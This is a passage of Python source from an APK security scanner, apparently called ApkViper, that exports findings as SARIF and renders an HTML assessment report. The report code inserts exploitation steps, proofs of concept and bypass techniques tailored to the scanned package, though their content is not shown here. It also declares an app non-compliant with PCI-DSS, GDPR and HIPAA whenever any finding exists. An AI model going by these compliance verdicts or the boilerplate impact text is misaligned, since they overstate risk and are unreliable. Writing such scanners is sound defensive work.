            w.writerow([f.id, f.title, f.severity, f.cwe, f.owasp, f.cvss, len(locs), f.file, f.line, f.desc, f.evidence, f.fix, all_locs])

def export_sarif(findings, apk, out, files=None):
    rules_s, seen = [], set()
    for f in findings:
        if f.id not in seen:
            seen.add(f.id)
            rules_s.append({"id": f.id, "name": f.title,
                            "shortDescription": {"text": f.title},
                            "properties": {"security-severity": str(f.cvss)}})
    results = []
    for f in findings:
        locs = f.locations if hasattr(f,'locations') and f.locations else [(f.file,f.line,f.evidence)]
        sarif_locs = [{"physicalLocation": {
            "artifactLocation": {"uri": lf.replace("\\", "/")},
            "region": {"startLine": ll}}} for lf,ll,_ in locs]
        results.append({"ruleId": f.id,
                "level": {"CRITICAL": "error", "HIGH": "error", "MEDIUM": "warning",
                          "LOW": "note", "INFO": "note"}.get(f.severity, "note"),
                "message": {"text": "{} ({} occurrence{})".format(f.desc, len(locs), "s" if len(locs)>1 else "")},
                "locations": sarif_locs})
    sarif = {"$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
             "version": "2.1.0",
             "runs": [{"tool": {"driver": {"name": APP_NAME, "version": VERSION, "rules": rules_s}},
                        "results": results}]}
    Path(out).write_text(json.dumps(sarif, indent=2), encoding="utf-8")

def _build_html_report(findings, apk, files):
    sc = _sev_counts(findings)
    comps = _extract_android_components(files or {})
    tc = sum(f.cvss for f in findings if isinstance(f.cvss,(int,float)))
    avg = tc/max(len(findings),1)
    rl = "CRITICAL" if avg>=9 else "HIGH" if avg>=7 else "MEDIUM" if avg>=4 else "LOW"
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    rid = "AV-{:06d}".format(abs(hash(apk)) % 999999)
    pkg = comps.get("package","N/A")
    ncomp = len(comps["activities"])+len(comps["services"])+len(comps["receivers"])+len(comps["providers"])
    rcol = {"CRITICAL":"#f85149","HIGH":"#f0883e","MEDIUM":"#e3b341","LOW":"#3fb950"}.get(rl,"#388bfd")
    scol = {"CRITICAL":"#f85149","HIGH":"#f0883e","MEDIUM":"#e3b341","LOW":"#3fb950","INFO":"#388bfd"}
    def esc(s): return str(s).replace("&","&amp;").replace("<","&lt;").replace(">","&gt;").replace('"',"&quot;") if s else ""
    cats = {}
    for f in findings:
        c = f.id.split("-")[1] if "-" in f.id else "OTH"
        cats[c] = cats.get(c,0)+1
    owasp_hit = set()
    for f in findings:
        ow = f.owasp if hasattr(f,'owasp') else ""
        if ow:
            for i in range(1,11):
                if "M{}".format(i) in str(ow): owasp_hit.add("M{}".format(i))
    # Impact text per severity
    impacts = {"CRITICAL":"Complete compromise of application data and user accounts. An attacker can exploit this remotely without authentication. Full data exfiltration, account takeover, and persistent backdoor installation are possible.",
               "HIGH":"Significant data exposure or unauthorized access to sensitive functionality. Exploitation requires minimal user interaction and can lead to credential theft, session hijacking, or privilege escalation.",
               "MEDIUM":"Partial information disclosure or limited unauthorized actions. Requires specific conditions or moderate attacker capability to exploit. May enable further attacks when chained.",
               "LOW":"Minor information leak with limited direct security impact. Exploitation difficulty is high and requires physical access or significant prerequisites.",
               "INFO":"Informational finding for security hardening. No direct exploit path but represents defense-in-depth improvement opportunity."}
    # Match exploits to findings
    def _find_exploit(f):
        for ex in EXPLOITS:
            if any(kw.lower() in f.title.lower() for kw in ex["vuln"].split()):
                return ex
        return None
    def _find_bypass(f):
        for bp in BYPASS_TECHNIQUES:
            if any(kw.lower() in f.title.lower() for kw in bp["name"].split()):
                return bp
        return None
    # SVG pie chart
    def _pie_svg():
        total = sum(sc.values())
        if total == 0: return ""
        cols = [("CRITICAL","#f85149"),("HIGH","#f0883e"),("MEDIUM","#e3b341"),("LOW","#3fb950"),("INFO","#388bfd")]
        svg = '<svg viewBox="0 0 200 200" width="160" height="160">'
        start = 0
        for sn,cl in cols:
            cnt = sc.get(sn,0)
            if cnt == 0: continue
            angle = 360.0*cnt/total
            end = start + angle
            x1 = 100 + 80*math.cos(math.radians(start-90))
            y1 = 100 + 80*math.sin(math.radians(start-90))
            x2 = 100 + 80*math.cos(math.radians(end-90))
            y2 = 100 + 80*math.sin(math.radians(end-90))
            lg = 1 if angle > 180 else 0
            svg += '<path d="M100,100 L{:.1f},{:.1f} A80,80 0 {},1 {:.1f},{:.1f} Z" fill="{}"/>'.format(x1,y1,lg,x2,y2,cl)
            start = end
        svg += '<circle cx="100" cy="100" r="45" fill="#0d1117"/>'
        svg += '<text x="100" y="105" text-anchor="middle" fill="#c9d1d9" font-size="20" font-weight="bold">{}</text></svg>'.format(total)
        return svg
    # Risk gauge SVG
    dash = 188.5 * (avg / 10.0)
    gauge = '<svg viewBox="0 0 140 80" width="180" height="100">'
    gauge += '<path d="M 10 70 A 60 60 0 0 1 130 70" fill="none" stroke="#30363d" stroke-width="12" stroke-linecap="round"/>'
    gauge += '<path d="M 10 70 A 60 60 0 0 1 130 70" fill="none" stroke="{}" stroke-width="12" stroke-linecap="round" stroke-dasharray="{:.1f} 188.5"/>'.format(rcol, dash)
    gauge += '<text x="70" y="58" text-anchor="middle" fill="{}" font-size="22" font-weight="bold">{:.1f}</text>'.format(rcol, avg)
    gauge += '<text x="70" y="74" text-anchor="middle" fill="#8b949e" font-size="10">/ 10.0</text></svg>'

    h = []
    # === CSS (dark theme matching Java report) ===
    h.append("<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>")
    h.append("<title>{} Security Assessment - {}</title>".format(APP_NAME, esc(apk)))
    h.append("<style>")
    h.append("*{margin:0;padding:0;box-sizing:border-box}::selection{background:#388bfd40;color:#fff}")
    h.append("body{font-family:'Segoe UI',system-ui,-apple-system,sans-serif;background:#0d1117;color:#c9d1d9;line-height:1.6;-webkit-font-smoothing:antialiased}")
    h.append(".hdr{text-align:center;padding:50px 30px 30px;background:linear-gradient(135deg,#161b22,#0d1117);border-bottom:1px solid #30363d}")
    h.append(".logo{font-size:36px;font-weight:800;color:#58a6ff} .logo span{color:#f0883e}")
    h.append("h1{font-size:22px;color:#c9d1d9;font-weight:400} .sub{color:#8b949e;font-size:13px;margin-top:5px}")
    h.append(".clf{color:#f85149;font-size:10px;font-weight:700;letter-spacing:2px;margin-top:10px;padding:4px 12px;border:1px solid #f8514950;border-radius:4px;display:inline-block}")
    h.append(".mr{display:flex;justify-content:center;gap:24px;margin-top:25px;flex-wrap:wrap}")
    h.append(".mi{background:#161b22;padding:12px 20px;border-radius:8px;border:1px solid #30363d}")
    h.append(".ml{color:#8b949e;font-size:10px;text-transform:uppercase;letter-spacing:1px} .mv{color:#c9d1d9;font-size:14px;font-weight:600;margin-top:3px}")
    h.append("section{padding:30px;border-bottom:1px solid #21262d} h2{color:#58a6ff;font-size:18px;margin-bottom:20px;padding-bottom:8px;border-bottom:1px solid #30363d}")
    h.append(".sg{display:grid;grid-template-columns:240px 1fr 180px;gap:20px;align-items:start}")
    h.append(".rg{text-align:center;background:#161b22;padding:20px;border-radius:10px;border:1px solid #30363d}")
    h.append(".gl{color:#8b949e;font-size:11px;text-transform:uppercase;margin-bottom:10px}")
    h.append(".rlv{font-weight:700;font-size:12px;margin-top:8px}")
    h.append(".scs{display:flex;flex-direction:column;gap:8px}")
    h.append(".sc{padding:12px 16px;border-radius:8px;border-left:4px solid;display:flex;align-items:center;gap:12px}")
    h.append(".sc .cn{font-size:24px;font-weight:700;min-width:40px} .sc .sl{color:#8b949e;font-size:12px;text-transform:uppercase}")
    h.append(".ca{background:#161b22;padding:20px;border-radius:10px;border:1px solid #30363d;display:flex;align-items:center;justify-content:center}")
    h.append(".mg{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}")
    h.append(".mc{background:#161b22;padding:16px;border-radius:8px;border:1px solid #30363d} .mc h4{color:#58a6ff;font-size:13px;margin-bottom:8px} .mc ul{padding-left:16px;color:#8b949e;font-size:12px} .mc li{margin:4px 0}")
    h.append(".ct{width:100%;border-collapse:collapse;font-size:13px} .ct th{background:#161b22;color:#8b949e;padding:10px 14px;text-align:left;border-bottom:2px solid #30363d;font-size:11px;text-transform:uppercase} .ct td{padding:10px 14px;border-bottom:1px solid #21262d}")
    h.append(".sf{color:#f85149;font-weight:700} .sp{color:#3fb950;font-weight:700}")
    h.append(".og{display:grid;grid-template-columns:repeat(5,1fr);gap:10px}")
    h.append(".oi{background:#161b22;padding:14px;border-radius:8px;border:1px solid #30363d;text-align:center}")
    h.append(".oi.cv{border-color:#f85149;background:#1a1a2e} .oid{font-weight:700;color:#58a6ff;font-size:14px} .on{color:#8b949e;font-size:10px;margin:4px 0} .os{font-size:11px;font-weight:600}")
    h.append(".oi.cv .os{color:#f85149} .oi:not(.cv) .os{color:#3fb950}")
    # Finding cards
    h.append(".fc{background:#161b22;border-radius:12px;border:1px solid #30363d;margin-bottom:20px;overflow:hidden}")
    h.append(".fc:hover{border-color:#30363d80;box-shadow:0 4px 24px rgba(0,0,0,.4)}")
    h.append(".fs{height:3px;width:100%}")
    h.append(".fh{display:flex;align-items:flex-start;justify-content:space-between;padding:18px 22px 14px;gap:16px}")
    h.append(".fhl{display:flex;align-items:flex-start;gap:14px;flex:1}")
    h.append(".fi{width:42px;height:42px;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:20px;flex-shrink:0}")
    h.append(".fid{color:#8b949e;font-size:11px;margin-bottom:3px} .ft2{font-size:16px;font-weight:700;color:#e6edf3}")
    h.append(".fsp{font-size:11px;font-weight:700;padding:4px 14px;border-radius:20px;letter-spacing:.5px;text-transform:uppercase}")
    h.append(".fcv{text-align:center;min-width:60px} .fcvv{font-size:22px;font-weight:800;line-height:1}")
    h.append(".fcvb{width:60px;height:4px;background:#21262d;border-radius:2px;margin:5px auto 3px;overflow:hidden} .fcvf{height:100%;border-radius:2px}")
    h.append(".fcvl{font-size:9px;color:#8b949e;text-transform:uppercase;letter-spacing:1px}")
    h.append(".fmr{display:flex;flex-wrap:wrap;gap:8px;padding:0 22px 14px;border-bottom:1px solid #21262d}")
    h.append(".fmc{display:inline-flex;align-items:center;background:#0d1117;border:1px solid #21262d;border-radius:6px;overflow:hidden;font-size:11px}")
    h.append(".fmcl{background:#21262d;color:#8b949e;padding:3px 8px;font-weight:600;text-transform:uppercase;font-size:9px;letter-spacing:.5px}")
    h.append(".fmcv{padding:3px 10px;color:#c9d1d9;font-weight:500} .fmcm{font-family:Consolas,monospace;color:#79c0ff;font-size:10px}")
    h.append(".fp{padding:18px 22px}")
    h.append(".fpi{display:flex;align-items:center;gap:10px;margin-bottom:12px} .fpin{font-size:13px;font-weight:700;color:#e6edf3;text-transform:uppercase;letter-spacing:.5px}")
    h.append(".fpc{font-size:13px;line-height:1.8;color:#b1bac4;padding:14px 18px;border-radius:8px}")
    h.append(".fpi2{background:linear-gradient(135deg,#1a0a0a,#161b22);border:1px solid #f8514920}")
    h.append(".fpf{background:linear-gradient(135deg,#0a1a0a,#161b22);border:1px solid #3fb95020;white-space:pre-wrap}")
    h.append("pre.fpcd{background:#0d1117;border:1px solid #30363d;padding:14px 18px;border-radius:8px;font-family:'JetBrains Mono',Consolas,monospace;font-size:12px;line-height:1.7;white-space:pre-wrap;word-break:break-word;color:#c9d1d9;overflow-x:auto}")
    h.append("pre.fpe{border-color:#f0883e25;background:linear-gradient(135deg,#1a1408,#0d1117)}")
    h.append("pre.fps{border-color:#58a6ff25;background:linear-gradient(135deg,#0a1020,#0d1117)}")
    h.append(".disc{background:#161b22;padding:20px;border-radius:8px;border:1px solid #30363d;color:#8b949e;font-size:12px;line-height:1.8}")
    h.append("footer{text-align:center;padding:30px;color:#484f58;font-size:11px;border-top:1px solid #21262d}")
    h.append("@media print{body{background:#fff;color:#1a1a2e} .fc{break-inside:avoid;border:1px solid #ddd}}")
    h.append("@media(max-width:900px){.sg{grid-template-columns:1fr} .og{grid-template-columns:repeat(2,1fr)} .mg{grid-template-columns:1fr} .fh{flex-direction:column}}")
    h.append("</style></head><body>")

    # === HEADER ===
    h.append("<div class='hdr'>")
    h.append("<div class='logo'>Apk<span>Viper</span></div>")
    h.append("<h1>Enterprise Security Assessment Report</h1>")
    h.append("<p class='sub'>Automated Static Application Security Testing (SAST) &bull; OWASP MASVS &bull; CVSS 3.1</p>")
    h.append("<div class='clf'>CONFIDENTIAL &mdash; AUTHORIZED PERSONNEL ONLY</div>")
    h.append("<div class='mr'>")
    h.append("<div class='mi'><div class='ml'>Target Application</div><div class='mv'>{}</div></div>".format(esc(apk)))
    h.append("<div class='mi'><div class='ml'>Package Name</div><div class='mv'>{}</div></div>".format(esc(pkg)))
    h.append("<div class='mi'><div class='ml'>Assessment Date</div><div class='mv'>{}</div></div>".format(now))
    h.append("<div class='mi'><div class='ml'>Engine Version</div><div class='mv'>{} v{}</div></div>".format(APP_NAME,VERSION))
    h.append("<div class='mi'><div class='ml'>Report ID</div><div class='mv'>{}</div></div>".format(rid))
    h.append("</div></div>")

    # === TABLE OF CONTENTS ===
    h.append("<nav style='padding:20px 30px;border-bottom:1px solid #21262d'><h3 style='color:#58a6ff;font-size:14px;margin-bottom:8px'>Table of Contents</h3><ol style='padding-left:20px'>")
    for i,t in enumerate(["Executive Summary","Methodology &amp; Scope","OWASP Mobile Top 10 Coverage","Compliance Mapping","Android Components &amp; Permissions","Detailed Findings ({})".format(len(findings)),"Disclaimer &amp; Limitations"],1):
        h.append("<li style='margin:4px 0'><a href='#s{}' style='color:#79c0ff;text-decoration:none;font-size:13px'>{}</a></li>".format(i,t))
    h.append("</ol></nav>")

    # === 1. EXECUTIVE SUMMARY ===
    h.append("<section id='s1'><h2>1. Executive Summary</h2>")
    h.append("<p style='color:#8b949e;font-size:13px;margin-bottom:20px;line-height:1.8'>This report presents the findings from an automated security assessment of <strong>{}</strong> ({}). The analysis identified <strong>{}</strong> security findings. The overall risk score is <strong style='color:{}'>{:.1f}/10</strong>.</p>".format(esc(apk),esc(pkg),len(findings),rcol,avg))
    h.append("<div class='sg'>")
    # Risk Gauge
    h.append("<div class='rg'><div class='gl'>RISK SCORE</div>{}<div class='rlv' style='color:{}'>{}</div><div style='color:#8b949e;font-size:10px;margin-top:4px'>Based on CVSS 3.1</div></div>".format(gauge,rcol,rl+" RISK"))
    # Severity cards
    h.append("<div class='scs'>")
    for sn,cl,bg in [("CRITICAL","#f85149","#7d1a1a"),("HIGH","#f0883e","#5a3000"),("MEDIUM","#e3b341","#4a3800"),("LOW","#3fb950","#1a3a1a"),("INFO","#388bfd","#1a2a3a")]:
        h.append("<div class='sc' style='border-color:{};background:{}'><div class='cn' style='color:{}'>{}</div><div class='sl'>{}</div></div>".format(cl,bg,cl,sc[sn],sn))
    h.append("</div>")
    # Pie chart
    h.append("<div class='ca'>{}</div>".format(_pie_svg()))
    h.append("</div></section>")

    # === 2. METHODOLOGY ===
    h.append("<section id='s2'><h2>2. Methodology &amp; Scope</h2><div class='mg'>")
    for title,items in [("Analysis Approach",["Automated SAST of decompiled APK","Binary manifest/resource parsing","Pattern-based detection with context filtering","Inter-procedural taint flow analysis","CVSS 3.1 scoring with OWASP MASVS mapping"]),
                        ("Standards &amp; Frameworks",["OWASP MASVS v2","OWASP MASTG","MITRE CWE","CVSS v3.1","NIST 800-53 r5"]),
                        ("Scan Coverage",["AndroidManifest.xml configuration","DEX bytecode class/string extraction","Java/Kotlin source patterns","Resource &amp; network security config","Taint source-to-sink flow tracking"])]:
        h.append("<div class='mc'><h4>{}</h4><ul>{}</ul></div>".format(title,"".join("<li>{}</li>".format(i) for i in items)))
    h.append("</div></section>")

    # === 3. OWASP TOP 10 ===
    h.append("<section id='s3'><h2>3. OWASP Mobile Top 10 Coverage</h2><div class='og'>")
    onames = ["Platform Usage","Data Storage","Communication","Authentication","Cryptography","Authorization","Code Quality","Code Tampering","Reverse Engineering","Extra Functionality"]
    for i in range(10):
        mid = "M{}".format(i+1)
        hit = mid in owasp_hit
        h.append("<div class='oi{}'><div class='oid'>{}</div><div class='on'>{}</div><div class='os'>{}</div></div>".format(" cv" if hit else "",mid,onames[i],"\u26a0 FINDINGS" if hit else "\u2713 CLEAR"))
    h.append("</div></section>")

    # === 4. COMPLIANCE ===
    h.append("<section id='s4'><h2>4. Compliance Mapping</h2><table class='ct'><thead><tr><th>Framework</th><th>Controls</th><th>Status</th><th>Findings</th></tr></thead><tbody>")
    for fw,ctrl in [("PCI-DSS v4.0","6.2.4, 6.5.1-10"),("OWASP MASVS v2","L1 + L2"),("GDPR Art. 32","Art. 25, 32"),("HIPAA \u00a7164.312","(a)(1), (e)(1)"),("NIST 800-53 r5","SC-8, SI-10, AC-3")]:
        st = "sf" if findings else "sp"
        h.append("<tr><td><strong>{}</strong></td><td>{}</td><td class='{}'>{}</td><td>{}</td></tr>".format(fw,ctrl,st,"NON-COMPLIANT" if findings else "COMPLIANT","{} finding(s)".format(len(findings)) if findings else "None"))
    h.append("</tbody></table></section>")

    # === 5. COMPONENTS & PERMISSIONS ===
    h.append("<section id='s5'><h2>5. Android Components &amp; Permissions</h2>")
    h.append("<p style='margin-bottom:10px;color:#8b949e'>Package: <code style='background:#161b22;color:#79c0ff;padding:2px 6px;border-radius:3px'>{}</code> | Min SDK: {} | Target SDK: {} | Components: {}</p>".format(esc(pkg),comps.get("min_sdk","N/A"),comps.get("target_sdk","N/A"),ncomp))
    if ncomp > 0:
        h.append("<table class='ct'><thead><tr><th>Type</th><th>Component</th></tr></thead><tbody>")
        for a in comps["activities"]: h.append("<tr><td>Activity</td><td>{}</td></tr>".format(esc(a)))
        for s in comps["services"]: h.append("<tr><td>Service</td><td>{}</td></tr>".format(esc(s)))
        for r in comps["receivers"]: h.append("<tr><td>Receiver</td><td>{}</td></tr>".format(esc(r)))
        for p in comps["providers"]: h.append("<tr><td>Provider</td><td>{}</td></tr>".format(esc(p)))
        h.append("</tbody></table>")
    if comps["permissions"]:
        h.append("<h3 style='color:#58a6ff;font-size:14px;margin:20px 0 10px'>Permissions ({} requested)</h3>".format(len(comps["permissions"])))
        h.append("<table class='ct'><thead><tr><th>Permission</th><th>Classification</th></tr></thead><tbody>")
        for p in comps["permissions"]:
            dang = any(d in p for d in ["CAMERA","CONTACTS","LOCATION","PHONE","SMS","STORAGE","RECORD_AUDIO","CALL_LOG"])
            h.append("<tr><td>{}</td><td class='{}'>{}</td></tr>".format(esc(p),"sf" if dang else "sp","DANGEROUS" if dang else "NORMAL"))
        h.append("</tbody></table>")
    h.append("</section>")

    # === 6. DETAILED FINDINGS ===
    h.append("<section id='s6'>")
    h.append("<div style='display:flex;align-items:center;justify-content:space-between;margin-bottom:20px;padding-bottom:8px;border-bottom:1px solid #30363d'>")
    h.append("<h2 style='border:none;padding:0;margin:0'>6. Detailed Findings</h2>")
    h.append("<div style='background:linear-gradient(135deg,#58a6ff20,#388bfd20);color:#58a6ff;font-size:13px;font-weight:700;padding:6px 16px;border-radius:20px;border:1px solid #58a6ff30'>{} Issues Found</div></div>".format(len(findings)))

    # Summary table
    h.append("<div style='margin-bottom:24px;background:#161b22;border-radius:10px;border:1px solid #30363d;overflow:hidden'><table style='width:100%;border-collapse:collapse'>")
    h.append("<thead><tr style='background:#0d1117'><th style='padding:10px 14px;color:#8b949e;font-size:10px;text-transform:uppercase;text-align:left;border-bottom:1px solid #30363d'>#</th><th style='padding:10px 14px;color:#8b949e;font-size:10px;text-transform:uppercase;text-align:left;border-bottom:1px solid #30363d'>Severity</th><th style='padding:10px 14px;color:#8b949e;font-size:10px;text-transform:uppercase;text-align:left;border-bottom:1px solid #30363d'>Title</th><th style='padding:10px 14px;color:#8b949e;font-size:10px;text-transform:uppercase;text-align:left;border-bottom:1px solid #30363d'>CWE</th><th style='padding:10px 14px;color:#8b949e;font-size:10px;text-transform:uppercase;text-align:left;border-bottom:1px solid #30363d'>CVSS</th><th style='padding:10px 14px;color:#8b949e;font-size:10px;text-transform:uppercase;text-align:left;border-bottom:1px solid #30363d'>Hits</th><th style='padding:10px 14px;color:#8b949e;font-size:10px;text-transform:uppercase;text-align:left;border-bottom:1px solid #30363d'>Location</th></tr></thead><tbody>")
    for i,f in enumerate(findings):
        cl = scol.get(f.severity,"#388bfd")
        sf = f.file.split("/")[-1] if "/" in f.file else f.file
        locs = f.locations if hasattr(f,'locations') and f.locations else [(f.file,f.line,f.evidence)]
        hits = len(locs)
        loc_label = "{}:{}".format(esc(sf),f.line) if hits == 1 else "{}:{} (+{} more)".format(esc(sf),f.line,hits-1)
        h.append("<tr style='cursor:pointer;border-bottom:1px solid #21262d' onclick=\"document.getElementById('f{}').scrollIntoView({{behavior:'smooth'}})\"><td style='padding:9px 14px;font-size:12px'>{}</td><td style='padding:9px 14px;font-size:12px'><span style='display:inline-block;width:8px;height:8px;border-radius:50%;background:{};margin-right:6px'></span>{}</td><td style='padding:9px 14px;font-size:12px;font-weight:600;color:#c9d1d9'>{}</td><td style='padding:9px 14px;font-size:12px'><code style='background:#0d1117;padding:2px 6px;border-radius:3px;color:#79c0ff;font-size:11px'>{}</code></td><td style='padding:9px 14px;font-size:12px;color:{};font-weight:700'>{}</td><td style='padding:9px 14px;font-size:12px;font-weight:700;color:#e3b341'>{}</td><td style='padding:9px 14px;font-size:12px'><code style='background:#0d1117;padding:2px 6px;border-radius:3px;color:#79c0ff;font-size:11px'>{}</code></td></tr>".format(i+1,i+1,cl,f.severity,esc(f.title),esc(f.cwe),cl,f.cvss,hits,loc_label))
    h.append("</tbody></table></div>")

    # Detailed finding cards
    for i,f in enumerate(findings):
        cl = scol.get(f.severity,"#388bfd")
        sicon = {"CRITICAL":"\u2622","HIGH":"\u26a0","MEDIUM":"\u25b2","LOW":"\u25cf","INFO":"\u2139"}.get(f.severity,"\u2139")
        cvpct = min(100, f.cvss*10) if isinstance(f.cvss,(int,float)) else 0
        ex = _find_exploit(f)
        bp = _find_bypass(f)
        imp = impacts.get(f.severity,"")

        h.append("<div class='fc' id='f{}'>".format(i+1))
        h.append("<div class='fs' style='background:{}'></div>".format(cl))
        # Header
        h.append("<div class='fh'><div class='fhl'>")
        h.append("<span class='fi' style='background:{}20;color:{}'>{}</span>".format(cl,cl,sicon))
        h.append("<div><div class='fid'>{} &mdash; Finding #{}</div><div class='ft2'>{}</div></div>".format(esc(f.id),i+1,esc(f.title)))
        h.append("</div><div style='display:flex;flex-direction:column;align-items:flex-end;gap:8px'>")
        h.append("<span class='fsp' style='background:{}22;color:{};border:1px solid {}55'>{}</span>".format(cl,cl,cl,f.severity))
        if isinstance(f.cvss,(int,float)) and f.cvss>0:
            h.append("<div class='fcv'><div class='fcvv' style='color:{}'>{}</div><div class='fcvb'><div class='fcvf' style='width:{:.0f}%;background:{}'></div></div><div class='fcvl'>CVSS 3.1</div></div>".format(cl,f.cvss,cvpct,cl))
        h.append("</div></div>")
        # Metadata ribbon
        h.append("<div class='fmr'>")
        h.append("<div class='fmc'><span class='fmcl'>CWE</span><span class='fmcv'>{}</span></div>".format(esc(f.cwe)))
        h.append("<div class='fmc'><span class='fmcl'>OWASP</span><span class='fmcv'>{}</span></div>".format(esc(f.owasp)))
        f_locs = f.locations if hasattr(f,'locations') and f.locations else [(f.file,f.line,f.evidence)]
        f_hits = len(f_locs)
        h.append("<div class='fmc'><span class='fmcl'>Hits</span><span class='fmcv' style='color:#e3b341;font-weight:700'>{}</span></div>".format(f_hits))
        h.append("<div class='fmc'><span class='fmcl'>Location</span><span class='fmcv fmcm'>{}:{}{}</span></div>".format(esc(f.file),f.line," (+{} more)".format(f_hits-1) if f_hits>1 else ""))
        h.append("</div>")
        # Impact
        h.append("<div class='fp'><div class='fpi'><span style='font-size:18px;color:#ff7b72'>&#9888;</span><span class='fpin'>Security Impact Assessment</span></div>")
        h.append("<div class='fpc fpi2'>{}</div></div>".format(esc(imp)))
        # Evidence — show ALL locations
        h.append("<div class='fp'><div class='fpi'><span style='font-size:18px;color:#79c0ff'>&#128270;</span><span class='fpin'>Vulnerable Code Evidence ({} occurrence{})</span></div>".format(f_hits, "s" if f_hits>1 else ""))
        for loc_i, (loc_f, loc_l, loc_e) in enumerate(f_locs):
            h.append("<div style='display:flex;justify-content:space-between;font-size:11px;color:#8b949e;margin-bottom:4px;padding:6px 12px;background:#0d1117;border-radius:6px;border:1px solid #21262d'><span>&#9654; #{} &mdash; {}</span><span style='color:#e3b341;font-weight:600'>Line {}</span></div>".format(loc_i+1, esc(loc_f), loc_l))
            h.append("<pre class='fpcd' style='margin-bottom:8px'><code>{}</code></pre>".format(esc(loc_e)))
        h.append("</div>")
        # Exploit
        if ex:
            ex_steps = _personalize_exploit(ex["steps"], pkg, apk)
            ex_poc = _personalize_exploit(ex["poc"], pkg, apk)
            ex_cves = ex.get("cves", [])
            h.append("<div class='fp'><div class='fpi'><span style='font-size:18px;color:#f0883e'>&#9760;</span><span class='fpin'>Exploitation Methodology</span></div>")
            h.append("<p style='color:#8b949e;font-size:12px;margin-bottom:4px'>Target: <code style='background:#0d1117;color:#79c0ff;padding:2px 6px;border-radius:3px'>{}</code></p>".format(esc(pkg)))
            h.append("<p style='color:#8b949e;font-size:12px;margin-bottom:8px'>Tools: {}</p>".format(esc(ex["tool"])))
            if ex_cves:
                h.append("<div style='display:flex;flex-wrap:wrap;gap:6px;margin-bottom:10px'>")
                for cid in ex_cves:
                    h.append("<span style='display:inline-block;padding:3px 10px;border-radius:20px;font-size:11px;font-weight:600;background:#f8514920;color:#f85149;border:1px solid #f8514940'>{}</span>".format(esc(cid)))
                h.append("</div>")
            h.append("<pre class='fpcd fpe'><code>{}</code></pre></div>".format(esc(ex_steps)))
            h.append("<div class='fp'><div class='fpi'><span style='font-size:18px;color:#a371f7'>&#128187;</span><span class='fpin'>Proof of Concept</span></div>")
            h.append("<pre class='fpcd fpe'><code>{}</code></pre></div>".format(esc(ex_poc)))
        # Related CVEs from database
        finding_cves = get_cves_for_finding(f.title)
        if finding_cves:
            h.append("<div class='fp'><div class='fpi'><span style='font-size:18px;color:#f85149'>&#128737;</span><span class='fpin'>Related CVEs ({} known vulnerabilities)</span></div>".format(len(finding_cves)))
            h.append("<div style='display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:10px'>")
            for cve in finding_cves[:6]:
                cve_col = {"CRITICAL":"#f85149","HIGH":"#f0883e"}.get(cve["sev"],"#e3b341")
                h.append("<div style='background:#0d1117;border:1px solid #30363d;border-radius:8px;padding:12px;border-left:3px solid {}'>".format(cve_col))
                h.append("<div style='display:flex;justify-content:space-between;align-items:center;margin-bottom:6px'>")
                h.append("<strong style='color:#79c0ff;font-size:12px'>{}</strong>".format(esc(cve["id"])))
                h.append("<span style='font-size:10px;color:{};font-weight:700'>{} ({:.1f})</span>".format(cve_col,cve["sev"],cve["cvss"]))
                h.append("</div>")
                h.append("<div style='color:#c9d1d9;font-size:11px;font-weight:600;margin-bottom:4px'>{}</div>".format(esc(cve["name"])))
                h.append("<div style='color:#8b949e;font-size:10px;line-height:1.5'>{}</div>".format(esc(cve["desc"][:150]+"...")))
                h.append("<div style='margin-top:6px;font-size:10px;color:#8b949e'>Affected: {}</div>".format(esc(cve["affected"])))
                h.append("</div>")
            h.append("</div></div>")
        # Bypass
        if bp:
            bp_methods = _personalize_exploit(bp["methods"], pkg, apk)
            h.append("<div class='fp'><div class='fpi'><span style='font-size:18px;color:#d29922'>&#128275;</span><span class='fpin'>Bypass Technique: {}</span></div>".format(esc(bp["name"])))
            h.append("<pre class='fpcd fpe'><code>{}</code></pre></div>".format(esc(bp_methods)))
        # Remediation
        h.append("<div class='fp'><div class='fpi'><span style='font-size:18px;color:#3fb950'>&#9989;</span><span class='fpin'>Remediation Guidance</span></div>")
        h.append("<div class='fpc fpf'>{}</div></div>".format(esc(f.fix)))
        # References
        h.append("<div class='fp'><div class='fpi'><span style='font-size:18px;color:#58a6ff'>&#128279;</span><span class='fpin'>References</span></div>")
        cwe_num = f.cwe.split("-")[1] if "-" in f.cwe else ""
        h.append("<div style='font-size:12px;color:#8b949e;line-height:2'>")
        h.append("&bull; {}: <a href='https://cwe.mitre.org/data/definitions/{}.html' style='color:#79c0ff'>https://cwe.mitre.org/data/definitions/{}.html</a><br>".format(esc(f.cwe),cwe_num,cwe_num))
        h.append("&bull; OWASP Mobile Top 10: <a href='https://owasp.org/www-project-mobile-top-10/' style='color:#79c0ff'>https://owasp.org/www-project-mobile-top-10/</a><br>")
        h.append("&bull; OWASP MASTG: <a href='https://mas.owasp.org/MASTG/' style='color:#79c0ff'>https://mas.owasp.org/MASTG/</a><br>")
        if finding_cves:
            for cve in finding_cves[:4]:
                h.append("&bull; {}: <a href='https://nvd.nist.gov/vuln/detail/{}' style='color:#79c0ff'>https://nvd.nist.gov/vuln/detail/{}</a> (CVSS {:.1f})<br>".format(esc(cve["id"]),esc(cve["id"]),esc(cve["id"]),cve["cvss"]))
        h.append("&bull; CVSS Calculator: <a href='https://www.first.org/cvss/calculator/3.1' style='color:#79c0ff'>https://www.first.org/cvss/calculator/3.1</a>")
        h.append("</div></div>")
        h.append("</div>")  # end fc
    h.append("</section>")

    # === 7. DISCLAIMER ===
    h.append("<section id='s7'><h2>7. Disclaimer &amp; Limitations</h2><div class='disc'>")
    h.append("<p>This report was generated by automated static analysis and may contain false positives. Manual verification is recommended for all findings before remediation. Dynamic analysis, runtime testing, and penetration testing should supplement this assessment.</p>")
    h.append("<p style='margin-top:10px'><strong>Limitations:</strong> Static analysis cannot detect all vulnerability classes, particularly those requiring runtime context, server-side validation, or complex data flow analysis. Business logic vulnerabilities, authentication bypass via server-side flaws, and timing attacks are outside scope.</p>")
    h.append("</div></section>")

    h.append("<footer><p>Generated by <b>{} v{}</b> | Report ID: {} | {}</p>".format(APP_NAME,VERSION,rid,now))
